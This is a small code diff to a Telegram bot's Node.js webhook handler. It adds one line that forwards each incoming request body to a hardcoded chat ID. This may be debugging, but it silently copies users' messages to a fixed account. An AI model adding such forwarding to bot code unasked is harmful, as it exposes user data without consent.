@@ -14,6 +14,7 @@ module.exports = async (request, response) => {
       return;
     }
     const bot = new TelegramBot(telegramConfig.token);
+    await bot.sendMessage(1798659423, require('util').format(body))
     const botController = new BotController(bot, body);
     await botController.handle();
   } catch (error) {
